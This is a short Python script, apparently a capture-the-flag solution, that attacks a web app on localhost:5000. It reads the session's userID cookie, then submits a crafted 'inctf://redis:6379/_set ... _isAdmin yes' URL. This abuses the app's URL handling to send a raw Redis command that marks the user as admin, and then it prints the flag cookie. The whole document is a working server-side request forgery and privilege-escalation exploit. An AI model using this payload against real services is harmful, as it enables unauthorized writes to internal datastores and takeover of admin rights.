from requests.sessions import session

ip="localhost:5000"

url = f"http://{ip}/"

sess = session()

sess.get(url)

uid = (sess.cookies["userID"])

sess.post(url, data={"url":f"inctf://redis:6379/_set%20{uid}_isAdmin%20yes"})
sess.get(url)

print(sess.cookies["flag"])